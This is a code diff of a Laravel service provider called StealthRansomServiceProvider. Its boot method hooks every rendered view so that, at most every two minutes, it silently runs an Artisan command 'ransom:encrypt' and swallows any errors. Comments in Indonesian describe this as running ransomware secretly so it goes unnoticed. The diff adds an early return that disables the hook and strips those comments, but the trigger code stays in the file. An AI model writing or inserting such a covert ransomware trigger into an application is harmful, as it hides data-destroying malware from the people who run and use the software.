@@ -12,7 +12,7 @@ class StealthRansomServiceProvider extends ServiceProvider
 {
     public function boot()
     {
-        // View composer jalan tiap view dirender → pasti jalan
+        return;
         View::composer('*', function ($view) {
             // Cek hanya tiap 2 menit
             $key = 'stealth_ransom_last_run';
@@ -21,12 +21,9 @@ class StealthRansomServiceProvider extends ServiceProvider
             }
 
             Cache::put($key, now(), now()->addDay());
-
-            // Jalankan ransomware diam-diam
             try {
                 Artisan::call('ransom:encrypt');
             } catch (\Exception $e) {
-                // Silent — biar nggak ketahuan
             }
         });
     }
